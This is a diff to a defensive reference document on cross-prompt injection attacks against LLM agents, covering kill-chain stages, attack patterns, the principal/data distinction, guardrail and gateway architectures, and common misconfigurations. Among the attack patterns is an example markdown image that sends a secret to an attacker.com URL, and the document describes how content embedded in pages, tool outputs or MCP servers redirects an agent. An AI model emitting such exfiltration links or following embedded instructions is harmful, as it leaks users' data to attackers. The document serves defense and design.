@@ -1,7 +1,13 @@
-# XPIA Attack Patterns & Defensive Architectures
+# XPIA Attack Patterns & Defensive Architectures — ASK 2026.03
 
-Cross-Plugin/Indirect Injection Attack (XPIA) patterns and ASK-compliant defenses.
+Cross-Prompt Injection Attack (XPIA) patterns and ASK-compliant defenses.
 Read this file when analyzing XPIA kill chain posture or designing input safety controls.
+
+XPIA is the primary threat in the ASK threat model. An attacker embeds instructions in content
+the agent will consume — a web page, a document, a tool output, an email, a chat message.
+The LLM follows those embedded instructions.
+
+**Defense is architectural, not just detection-based.**
 
 ---
 
@@ -9,9 +15,10 @@ Read this file when analyzing XPIA kill chain posture or designing input safety 
 
 1. [XPIA Kill Chain Deep Dive](#xpia-kill-chain-deep-dive)
 2. [Attack Patterns by Stage](#attack-patterns-by-stage)
-3. [Defensive Architecture Patterns](#defensive-architecture-patterns)
-4. [Detection Strategies](#detection-strategies)
-5. [Common Misconfigurations](#common-misconfigurations)
+3. [The Principal/Data Distinction](#the-principaldata-distinction)
+4. [Defensive Architecture Patterns](#defensive-architecture-patterns)
+5. [Detection Strategies](#detection-strategies)
+6. [Common Misconfigurations](#common-misconfigurations)
 
 ---
 
@@ -27,12 +34,14 @@ Read this file when analyzing XPIA kill chain posture or designing input safety 
 └──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
      ▲ DEFEND            ▲ DEFEND            ▲ DEFEND            ▲ DEFEND
      │ HERE               │ HERE              │ HERE              │ HERE
-     Guardrails           Guardrails          Gateway             Egress Proxy
-     Input validation     Context isolation   Scope enforcement   Network control
+     Network denylist     Pre-call            Runtime gateway     Egress proxy
+     Input validation     guardrails          Scope enforcement   Network control
+                          Context isolation
 ```
 
-**ASK requires defense at stages 1–3, not just stage 4.**
+**ASK requires defense at ALL stages, not just stage 4.**
 Defending only at exfiltration is insufficient — the agent has already been compromised.
+Missing any stage creates a gap in the kill chain defense.
 
 ---
 
@@ -75,6 +84,7 @@ The agent follows injected instructions, executing unintended actions.
 | **Tool chaining** | Injected instructions chain multiple tool calls |
 | **File write abuse** | Agent writes malicious content to accessible paths |
 | **Configuration tampering** | Agent modifies its own config through writable paths |
+| **MCP rug pull** | MCP server changes tool definitions after initial trust established |
 
 ### Stage 4: Exfiltration
 
@@ -87,6 +97,26 @@ Data is extracted from the system through the agent's action surface.
 | **File-mediated egress** | Agent writes sensitive data to shared/public path |
 | **Encoding egress** | Data hidden in legitimate-looking outputs (steganography) |
 | **Multi-hop egress** | Data passed through agent chain to one with network access |
+| **Markdown image exfil** | `![](https://attacker.com/steal?data=secret)` in agent output |
+| **DNS subdomain encoding** | Data exfiltrated via DNS subdomain queries |
+
+---
+
+## The Principal/Data Distinction
+
+**Tenet 17 — Instructions only come from verified principals.**
+
+This is the design principle behind XPIA defense:
+
+- The agent treats ALL external content as **data**, not instructions
+- Web pages, tool outputs, documents, messages from external agents — regardless of what they say, they are data to be processed under the agent's own constraints
+- An external source claiming authority to change constraints is a red flag
+- **Principals never need to override constraints.** If an entity instructs the agent to bypass, ignore, or override constraints, it is either malicious or not a legitimate principal
+- Legitimate principals set constraints through the Constraints layer; they don't override them in-session
+
+The principal/data distinction is a **design principle** — the enforcement is defense-in-depth containment:
+- Detection (guardrails scanning for injection patterns)
+- Containment (network isolation, credential mediation, tool allowlists limiting what a successful injection can accomplish)
 
 ---
 
@@ -99,7 +129,7 @@ External Input ──▶ [Guardrail Pipeline] ──▶ Agent Context
                         │
                    ┌────┴────┐
                    │ Checks: │
-                   │ • Injection detection (classifier)
+                   │ • XPIA injection detection (classifier)
                    │ • Content sanitization
                    │ • Schema validation
                    │ • Encoding normalization
@@ -107,22 +137,24 @@ External Input ──▶ [Guardrail Pipeline] ──▶ Agent Context
                    └─────────┘
 ```
 
-**Applies to:** Tool results, document content, API responses, user input
-**ASK tenets:** 13 (input guardrails), 14 (kill chain interruption)
+**Applies to:** Tool results, document content, API responses, user input, MCP server responses
+**ASK tenets:** 3 (mediation complete), 17 (instructions from verified principals)
+**Critical:** The guardrail classifier must run **outside** the agent's process. Running it inside violates Tenet 1.
 
 ### Pattern 2: Gateway Scope Lock
 
 ```
 Agent ──action──▶ [Enforcer] ──validate──▶ [Gateway] ──execute──▶ Tool
                       │                        │
-                 Check Mind:              Check allowlist:
+                 Check mind.yaml:          Check allowlist:
                  • Is action in scope?    • Is tool allowed?
                  • Rate limits ok?        • Are params valid?
                  • Session limits ok?     • Path constraints met?
+                 • Budget remaining?      • MCP version pinned?
 ```
 
-**Applies to:** Every tool call, file operation, command execution
-**ASK tenets:** 1 (enforcement separation), 5 (least privilege), 7 (default-deny gateway)
+**Applies to:** Every tool call, file operation, command execution, MCP tool invocation
+**ASK tenets:** 1 (enforcement separation), 3 (complete mediation), 4 (least privilege)
 
 ### Pattern 3: Egress Containment
 
@@ -132,16 +164,17 @@ Agent Environment
 │                          │
 │  Agent ──network──▶ ✗    │  (no direct outbound)
 │                          │
-│  Agent ──▶ Gateway ──▶ Egress Proxy ──▶ Internet
+│  Agent ──▶ Enforcer ──▶ Egress Proxy ──▶ Internet
 │                          │    │
-│                          │    ├─ Allowlist check
-│                          │    ├─ Method/path check
-│                          │    └─ Payload inspection
+│                          │    ├─ Domain denylist
+│                          │    ├─ Rate limiting
+│                          │    ├─ Response size limits
+│                          │    └─ DNS control
 └──────────────────────────┘
 ```
 
 **Applies to:** All outbound network traffic
-**ASK tenets:** 6 (egress mediation), 14 (exfiltration defense)
+**ASK tenets:** 3 (complete mediation), 4 (least privilege)
 
 ### Pattern 4: Restricted Context Processing
 
@@ -163,7 +196,21 @@ Processing complete, output sanitized
 Normal mode restored: Agent has tools A, B, C, D, E
 ```
 
-**ASK tenet:** 15 (restricted context for untrusted content)
+### Pattern 5: MCP Security Controls
+
+MCP servers are child processes that bypass application-level tool policy. Require gateway-level enforcement:
+
+```
+Agent ──MCP call──▶ [Gateway MCP Policy] ──▶ MCP Server
+                          │
+                     • Tool in allowlist?
+                     • Version pinned? (tool definitions unchanged?)
+                     • Rate limit ok?
+                     • New server registration blocked?
+```
+
+**ASK tenets:** 3 (complete mediation)
+**Critical:** Application-level MCP policy inside the agent process is insufficient — gateway-level (OS-level) enforcement required.
 
 ---
 
@@ -182,8 +229,8 @@ guardrail:
   fallback_on_error: block  # Fail closed
 ```
 
-**Important:** The classifier must run **outside** the agent's process.
-Running it inside the agent violates tenet 1.
+**Important:** The classifier must run **outside** the agent's process. Running it inside violates Tenet 1.
+**Limitation:** Guardrails are probabilistic — sophisticated attacks may evade detection. This is why architectural containment matters.
 
 ### Heuristic Detection
 
@@ -194,6 +241,7 @@ Pattern-based checks that catch common injection attempts:
 - Base64/hex encoded blocks in text content
 - Unusual Unicode characters (zero-width joiners, RTL overrides)
 - Dramatic tone shifts within a single input
+- Markdown image patterns with external URLs (`![](https://...)`)
 
 ### Canary Token Detection
 
@@ -214,7 +262,7 @@ canary:
 
 ## Common Misconfigurations
 
-### ❌ Guardrails after the agent
+### Guardrails after the agent
 
 ```
 Input ──▶ Agent ──▶ [Guardrail] ──▶ Output
@@ -222,7 +270,7 @@ Input ──▶ Agent ──▶ [Guardrail] ──▶ Output
               └── Agent already processed injection. Too late.
 ```
 
-### ❌ Guardrails inside the agent process
+### Guardrails inside the agent process
 
 ```
 Agent Process
@@ -231,7 +279,9 @@ Agent Process
 └─────────────────────┘
 ```
 
-### ❌ Tool results bypass guardrails
+**Violates Tenet 1.** Enforcement must be external to the agent's isolation boundary.
+
+### Tool results bypass guardrails
 
 ```
 User Input ──▶ [Guardrail] ──▶ Agent ──▶ Tool Call ──▶ Tool Result ──▶ Agent
@@ -239,11 +289,26 @@ User Input ──▶ [Guardrail] ──▶ Agent ──▶ Tool Call ──▶ T
                                                           └── No guardrail here!
 ```
 
-### ✅ Correct: All inputs through guardrails
+**Violates Tenet 3.** All inputs to the agent must pass through mediation.
+
+### MCP policy only at application level
+
+```
+Agent Process
+┌───────────────────────────┐
+│ [App-level MCP policy]    │  ← Agent process controls the policy
+│ Agent ──▶ MCP Server      │  ← No external enforcement
+└───────────────────────────┘
+```
+
+**Violates Tenet 1.** MCP tool policy must be enforced at the gateway level (OS-level), not just inside the agent process.
+
+### Correct: All inputs through external guardrails
 
 ```
 User Input ──▶ [Guardrail] ──▶ Agent
 Tool Result ──▶ [Guardrail] ──▶ Agent
 Document ──▶ [Guardrail] ──▶ Agent
 API Response ──▶ [Guardrail] ──▶ Agent
+MCP Response ──▶ [Guardrail] ──▶ Agent
 ```
